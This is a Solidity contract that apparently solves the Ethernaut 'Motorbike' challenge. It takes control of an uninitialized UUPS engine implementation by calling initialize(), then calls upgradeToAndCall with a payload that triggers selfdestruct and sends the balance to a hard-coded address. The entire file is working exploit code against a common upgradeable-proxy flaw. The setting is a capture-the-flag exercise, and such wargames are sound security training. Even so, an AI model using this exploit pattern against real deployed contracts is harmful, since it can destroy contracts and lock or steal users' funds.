// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external;
}

contract MotorbikeAttack7702 {
    address engine;
    address motorbike;

    address constant ETHERNAUT = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    address constant MOTORBIKE_LEVEL = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    address constant MAIN_EOA = 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2;
    address constant ENGINE_ADDRESS = 0xe87462E46b3617F65cdD4Ea132DeA2116C39B3De;
    address constant INSTANCE_ADDRESS = 0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E;

    function attack() public {
        createLevelInstance();

        IEngine(ENGINE_ADDRESS).initialize();
        bytes memory payload = abi.encodeWithSignature("destruct(address)", MAIN_EOA);
        IEngine(ENGINE_ADDRESS).upgradeToAndCall(address(this), payload);
    }

    function createLevelInstance() public {
        (bool success,) = ETHERNAUT.call(abi.encodeWithSignature("createLevelInstance(address)", MOTORBIKE_LEVEL));
        require(success, "Failed to create level instance");
    }

    function destruct(address _mainEoa) external {
        selfdestruct(payable(_mainEoa));
    }
}
